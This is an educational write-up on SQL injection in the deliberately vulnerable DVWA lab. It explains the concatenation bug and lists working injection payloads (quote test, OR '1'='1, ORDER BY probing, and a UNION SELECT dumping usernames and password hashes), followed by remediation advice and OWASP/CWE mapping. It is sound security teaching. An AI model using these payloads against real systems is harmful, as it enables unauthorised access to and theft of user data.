# SQL Injection — DVWA

> Part of the **Break It To Learn It** series. Educational content on intentionally vulnerable labs only — never run this against systems you aren't authorized to test.

## The bug
The application builds a SQL query by concatenating user input directly into the statement, so input can change the query's logic and read data it shouldn't.

## Find it
On the **SQL Injection** page, the `id` parameter is put straight into a query like:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '$id';
```

Entering a single quote `'` triggers a SQL error — the classic sign the input isn't parameterised.

## Break it (lab)
**Confirm the injection** — enter:

```
1'
```

An error confirms the quote breaks out of the string.

**Always-true condition** (returns every row):

```
1' OR '1'='1
```

**Find the number of columns** with ORDER BY until it errors:

```
1' ORDER BY 2-- -
```

**Extract data with UNION** (two columns here):

```
1' UNION SELECT user, password FROM users-- -
```

This dumps the username and password-hash column from the `users` table. In DVWA the hashes are MD5 — crackable offline for the lab's weak passwords, which shows why the whole chain matters.

_Add your own screenshots of each step here._

## Fix it
- Use **parameterised queries / prepared statements** — never concatenate input into SQL.
- Apply least-privilege on the DB account.
- Validate/allowlist input types (e.g. `id` must be an integer).
- Store passwords with a slow salted hash (bcrypt/argon2), not MD5.

## Mapped to
**OWASP:** A03:2021 – Injection  ·  **CWE:** CWE-89 (SQL Injection)
